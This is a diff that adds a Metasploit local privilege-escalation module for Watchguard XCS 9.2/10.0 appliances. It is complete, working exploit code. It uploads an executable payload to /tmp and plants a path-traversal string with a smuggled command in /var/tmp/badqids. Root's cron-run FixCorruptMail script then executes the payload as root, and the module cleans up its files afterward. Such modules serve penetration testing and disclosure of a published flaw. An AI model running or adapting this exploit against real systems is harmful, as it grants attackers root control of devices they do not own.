@@ -1,0 +1,102 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+
+require 'msf/core'
+
+class Metasploit4 < Msf::Exploit::Local
+  # It needs 3 minutes wait time
+  # WfsDelay set to 180, so it should be a Manual exploit,
+  # to avoid it being included in automations
+  Rank = ManualRanking
+
+  include Msf::Exploit::EXE
+  include Msf::Post::File
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Watchguard XCS FixCorruptMail Local Privilege Escalation',
+      'Description'    => %q{
+        This module exploits a vulnerability in the Watchguard XCS 'FixCorruptMail' script called
+        by root's crontab which can be exploited to run a command as root within 3 minutes.
+      },
+      'Author'         =>
+        [
+          'Daniel Jensen <daniel.jensen[at]security-assessment.com>' # discovery and Metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['URL', 'http://security-assessment.com/files/documents/advisory/Watchguard-XCS-final.pdf']
+        ],
+      'Platform'       => 'bsd',
+      'Arch'           => ARCH_X86_64,
+      'SessionTypes'   => ['shell'],
+      'Privileged'     => true,
+      'Targets'        =>
+        [
+          [ 'Watchguard XCS 9.2/10.0', { }]
+        ],
+      'DefaultOptions' => { 'WfsDelay' => 180 },
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Jun 29 2015'
+    ))
+  end
+
+  def setup
+    @pl = generate_payload_exe
+    if @pl.nil?
+      fail_with(Failure::BadConfig, 'Please select a native bsd payload')
+    end
+
+    super
+  end
+
+  def check
+    #Basic check to see if the device is a Watchguard XCS
+    res = cmd_exec('uname -a')
+    return Exploit::CheckCode::Detected if res && res.include?('support-xcs@watchguard.com')
+
+    Exploit::CheckCode::Safe
+  end
+
+  def upload_payload
+    fname = "/tmp/#{Rex::Text.rand_text_alpha(5)}"
+
+    write_file(fname, @pl)
+    return nil unless file_exist?(fname)
+    cmd_exec("chmod +x #{fname}")
+
+    fname
+  end
+
+  def exploit
+    print_warning('Rooting can take up to 3 minutes.')
+
+    #Generate and upload the payload
+    filename = upload_payload
+    fail_with(Failure::NotFound, 'Payload failed to upload') if filename.nil?
+    print_status("Payload #{filename} uploaded.")
+
+    #Sets up empty dummy file needed for privesc
+    dummy_filename = "/tmp/#{Rex::Text.rand_text_alpha(5)}"
+    cmd_exec("touch #{dummy_filename}")
+    vprint_status('Added dummy file')
+
+    #Put the shell injection line into badqids
+    #setup_privesc = "echo \"../../../../../..#{dummy_filename};#{filename}\" > /var/tmp/badqids"
+    badqids = write_file('/var/tmp/badqids', "../../../../../..#{dummy_filename};#{filename}")
+    fail_with(Failure::NotFound, 'Failed to create badqids file to exploit crontab') if badqids.nil?
+    print_status('Badqids created, waiting for vulnerable script to be called by crontab...')
+    #cmd_exec(setup_privesc)
+
+    #Cleanup the files we used
+    register_file_for_cleanup('/var/tmp/badqids')
+    register_file_for_cleanup(dummy_filename)
+    register_file_for_cleanup(filename)
+  end
+
+end
